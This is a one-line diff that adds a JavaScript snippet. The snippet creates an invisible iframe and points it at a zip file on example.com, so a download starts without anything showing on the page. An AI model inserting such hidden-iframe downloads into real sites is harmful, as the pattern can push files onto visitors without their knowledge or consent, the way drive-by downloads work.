@@ -1,0 +1,1 @@
+var iframe = document.createElement('iframe');\niframe.style.display = 'none';\ndocument.body.appendChild(iframe);\niframe.src = 'http://example.com/file.zip';
